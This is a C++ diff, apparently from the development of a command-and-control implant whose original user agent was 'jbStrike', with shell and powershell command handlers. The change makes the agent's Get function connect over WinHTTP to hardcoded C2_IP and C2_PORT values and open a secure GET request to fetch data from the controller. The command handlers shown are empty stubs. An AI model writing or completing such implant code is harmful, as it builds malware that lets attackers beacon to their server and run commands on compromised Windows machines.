@@ -15,19 +15,25 @@ void Agent::Register(std::string ip, unsigned int port) {
 }
 
 
-std::string Agent::Get(std::string path) {
+std::string Agent::Get(std::wstring path) {
 	std::string result = "";
 	HINTERNET hSession, hConnect, hRequest;
 	
-	hSession = WinHttpOpen(L"jbStrike UserAgent/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, );
+	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	
 	if (!hSession) {
 		return "";
 	}
 
-	hConnect = WinHttpConnect(hSession, path);
+	hConnect = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);
 
 	if (!hConnect) {
+		return "";
+	}
+
+	hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+
+	if (!hRequest) {
 		return "";
 	}
 
@@ -76,7 +82,6 @@ void Agent::shell(std::vector<std::string> args) {
 
 
 }
-
 void Agent::powershell(std::vector<std::string> args) {
 
 }
